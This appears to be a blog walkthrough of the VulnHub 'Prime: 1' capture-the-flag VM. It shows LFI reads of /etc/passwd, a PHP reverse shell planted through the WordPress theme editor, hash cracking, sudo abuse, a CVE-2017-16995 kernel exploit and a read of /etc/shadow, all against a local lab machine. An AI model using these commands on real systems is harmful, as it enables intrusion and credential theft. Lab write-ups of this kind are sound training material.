---
title: "Prime 1"
date: 2021-06-01T01:43:26+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - LFI
  - WordPress
  - Kernel Exploit
  - CVE-2017-16695
---

## Prime VulnHub Walkthrough

Download Prime: 1 VulnHub VM: [Prime: 1 ~ VulnHub](https://www.vulnhub.com/entry/prime-1,358/)

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24`
- Prime IP => 10.0.2.15

#### RustScan + Nmap

`sudo rustscan -a 10.0.2.15 -- -sS -sC -A`

```
10.0.2.10:22  => OpenSSH 7.2p2
10.0.2.10:80  => Apache httpd 2.4.18
```

#### Searchsploit

- `searchsploit openssh 7.2`

```
OpenSSH 7.2p2 - Username Enumeration | linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration | linux/remote/40113.txt
```

#### GoBuster

```
gobuster dir -u http://10.0.2.15 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -x txt,php,html
```

```
/dev            (Status: 200) [Size: 131]
/javascript     (Status: 301) [Size: 311] [--> http://10.0.2.15/javascript/]
/image.php      (Status: 200) [Size: 147]
/index.php      (Status: 200) [Size: 136]
/wordpress      (Status: 301) [Size: 310] [--> http://10.0.2.15/wordpress/]
/secret.txt     (Status: 200) [Size: 412]
/server-status  (Status: 403) [Size: 297]
```

---

### Exploitation

#### WordPress WPScan

- `wpscan --url http://10.0.2.15/wordpress -e`
- `User(s) Identified: victor`
- `wpscan --url http://10.0.2.15/wordpress -U victor -P /usr/share/wordlists/rockyou.txt`
- I ran this for a few minutes but it didn't find any passwords.

---

#### LFI

- `http://10.0.2.15/secret.txt`

```
Looks like you have got some secrets.

Ok I just want to do some help to you.

Do some more fuzz on every page of php which was finded by you.
And if you get any right parameter then follow the below steps.
If you still stuck
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

//see the location.txt and you will get your next move//
```

![VulnHub Prime secret.txt File](/imgs/prime/prime_secret_txt.png)

- So we have to try fuzzing every PHP page we found looking for the correct parameter to get the `location.txt` file.
- So basically, we have to try to exploit LFI to get `location.txt`.
- I decided to use my own tool [SyLFI](https://github.com/0xKirito/sylfi) which tests for LFI with a list of predefined common LFI parameters. I commented out the default payload to only include `location.txt` since that's the only file we are looking for and kept the directory traversal depth to 1.
- ```
  ./sylfi.py -u http://10.0.2.15/index.php -d 1
  ```

![VulnHub Prime LFI with SyLFI by 0xKirito](/imgs/prime/prime_lfi_with_sylfi.png)

- ```
  http://10.0.2.15/index.php?file=location.txt
  ```
- On visiting the link, it says:

```
ok well Now you reach at the exact parameter

Now dig some more for next one
use 'secrettier360' parameter on some other php page for more fun.
```

- So now we are given a LFI parameter `secrettier360` but not the file to look for. And the only other PHP file we found with GoBuster was `image.php`.
- I went with [SyLFI](https://github.com/0xKirito/sylfi) again as it supports known/custom LFI parameters. I removed `location.txt` from the payload and uncommented the default payload (common files like `/etc/passwd`) that I had commented out earlier.
- ```
  ./sylfi.py -u http://10.0.2.15/image.php -p "?secrettier360=" -d 1
  ```

![VulnHub Prime LFI with SyLFI by 0xKirito](/imgs/prime/prime_lfi_with_sylfi2.png)

- ```
  http://10.0.2.15/image.php?secrettier360=/etc/passwd
  ```
- The last few lines of `/etc/passwd` read:

```
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```

- `find password.txt file in my directory:/home/saket`
- So lets try that in the browser:
- ```
  http://10.0.2.15/image.php?secrettier360=/home/saket/password.txt
  ```
- Password => `follow_the_ippsec`
- I tried these credentials on SSH but it didn't work. I tried on WordPress login and it worked.

#### WordPress Exploitation

- WordPress => `victor`:`follow_the_ippsec`
- On WordPress dashboard, click on Appearance and select 'Theme Editor'. You will see some PHP files listed on the right. But we cannot write to them. I kept going through all the PHP files listed there and finally came across `secret.php` which was writable.

![VulnHub Prime WordPress Writable PHP File](/imgs/prime/prime_wordpress_writable_php_for_shell.png)

- Start a netcat listener: `nc -lvnp 4242`
- Paste the PHP reverse shell code in `secret.php` file with your Kali VM IP and port number for netcat listener. Save the changes and then open the file in browser.
- ```
  http://10.0.2.15/wordpress/wp-content/themes/twentynineteen/secret.php
  ```
- We will have a reverse shell as `www-data`.

#### Upgrading the Shell

- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `Ctrl + Z` to background the terminal with reverse shell. Then run `stty -a` to get the `columns` and `rows` on your terminal. I use a full screen terminal for better readability so these numbers might seem large and will be different for you.

```
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 38 columns 158; reset;
```

- We now have an upgraded reverse shell with tab completition, arrow keys support, etc.
- Press enter if you don't see the cursor or if its in some random place on the terminal.
- If the terminal still says: 'TERM environment variable not set.', set it manually with:
- `export TERM=xterm-256color` or `export TERM=xterm`

#### WordPress Configuration Files

- `cd /var/www/html/wordpress`
- `cat wp-config.php`

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'yourpasswordhere' );
```

### MySQL

- `mysql -u wordpress -p` => `yourpasswordhere`
- `show databases;`
- `use wordpress;`
- `show tables;`
- `select * from wp_users;`
- `exit;`

```
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | victor     | $P$BbJPY0i5LJ09e0nlpnyhZcxn.DvqDX/ | victor        | noemail@gmail.com |          | 2019-08-30 09:49:40 |                     |           0 | victor       |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
```

- Paste the hash in `crack.txt`.
- `hashid crack.txt -m` => 400
- ```
  hashcat -m 400 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O
  ```
- It ran through the entire `rockyou.txt` pretty quickly but did not yield any password.

#### User

- `cd /home/saket && ls`
- `cat user.txt`
- ```
  af3c658dcf9d7190da3153519c003456
  ```

---

### Privilege Escalation

- `sudo -l`

```
User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

- `sudo /home/saket/enc`
- It asks for a password. I tried the passwords we have so far but nothing worked.
- I went through other directories looking for anything I could find and read. Found a `backup` directory in `/opt`.
- ```
  cd /opt/backup/server_database
  ```
- `cat backup_pass`

```
your password for backup_database file enc is
"backup_password"
Enjoy!
```

![VulnHub Prime Backup Password for enc](/imgs/prime/prime_backup_db_password.png)

- Went back to `/home/saket` and ran `sudo /home/saket/enc` with `backup_password` as password.

![VulnHub Prime sudo enc](/imgs/prime/prime_sudo_enc.png)

- Two new files `enc.txt` and `key.txt` have been created.
- `cat enc.txt`

```
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
```

- `cat key.txt`

```
I know you are the fan of ippsec.
So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

- `ippsec` => MD5 => `366a74cb3c959de17d61db30591c39d1`

- Visit [AES Decryption](https://www.javainuse.com/aesgenerator) and enter the contents of `enc.txt` in 'Enter Encrypted Text to Decrypt'.
- We do not have Initialization Vector so I tried changing mode from CBC to ECB.
- Set Key Size to 256 bits. Enter the MD5 of "ippsec" that is `366a74cb3c959de17d61db30591c39d1` as Secret Key and click Decrypt.
- [This Prime walkthrough](https://lifesfun101.github.io/2019/09/15/Prime_1-walkthrough.html#privilege-escalation) provides a manual method of cracking this hash which is worth looking into.

```
Dont worry saket one day we will reach to
our destination very soon. And if you forget
your username then use your old password
==> "tribute_to_ippsec"
```

- `su saket` => `tribute_to_ippsec`
- And we are now logged in as user `saket`.
- `sudo -l`

```
User saket may run the following commands on ubuntu:
  (root) NOPASSWD: /home/victor/undefeated_victor
```

- ```
  sudo /home/victor/undefeated_victor
  ```
- ```
  /home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
  ```
- It seems to be looking for `/tmp/challenge` but there is no such file or directory in `/tmp`.
- But if we copy `/bin/bash` to `/tmp` as `challenge`, we might be able to invoke `bash` as `root`.
- `cp /bin/bash /tmp/challenge`
- ```
  sudo /home/victor/undefeated_victor
  ```
- And we have root access!
- `cat /root/root.txt`
- ```
  b2b17036da1de94cfb024540a8e7075a
  ```

![VulnHub Prime Root Proof](/imgs/prime/prime_root_proof.png)

#### Kernel Exploit

- After gaining access to the system, we can also try kernel exploits for privilege escalation.
- I used [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) for this.
- Used `wget` to download the raw perl script from GitHub and gave it execution permissions with `chmod +x`.
- `./linux-exploit-suggester-2.pl -d`
- It lists only one kernel exploit [CVE-2017-16695](https://www.exploit-db.com/exploits/45010) so lets download that.
- `searchsploit -p 45010`
- For details on how the exploit works, check out [eBPF and Analysis of the get-rekt-linux-hardened.c Exploit for CVE-2017-16995](https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html).
- `ls -la exploit_get_rekt && file exploit_get_rekt`

```
-rw-rw-r-- 1 saket saket 13728 Jun  1 10:31 exploit_get_rekt
exploit_get_rekt: C source, ASCII text, with CRLF line terminators
```

- Its a C file so lets rename it so and compile it.
- `mv exploit_get_rekt exploit_get_rekt.c`
- `gcc exploit_get_rekt.c -o exploit_get_rekt`
- `chmod +x exploit_get_rekt`

![VulnHub Prime Kernel Exploit Compile CVE-2017-16695](/imgs/prime/prime_kernel_exploit_compile_cve-2017-16695.png)

- Now lets run the executable to gain root.

![VulnHub Prime Kernel Exploit Root](/imgs/prime/prime_kernel_exploit_root.png)

#### Metasploit

- `msfconsole`
- `search linux 4.10.0`
- ```
  use exploit/linux/local/bpf_sign_extension_priv_esc
  ```

---

### Post Exploitation

- `cd /home/victor/Pictures`
- There is a screenshot which might be worth looking into.
- `python3 -m http.server 5050`
- ```
  http://10.0.2.15:5050/Screenshot%20from%202019-08-29%2011-27-05.png
  ```

![VulnHub Prime victor Password Screenshot](/imgs/prime/prime_victor_password_screenshot.png)

- ```
  victor:victorcandoanything
  ```
- I tried this password everywhere but it didn't work.

- `cat /etc/shadow`

```
root:$6$4JnZ9LD4$rvVg3L9wZnrTrFPHOvHfWav7WObqy/TybGeH6cQX3Z.bBMbRUnFkh2314qjAHbazsB7L.h/vd/ypi1XSnqC6E0:18140:0:99999:7:::
```
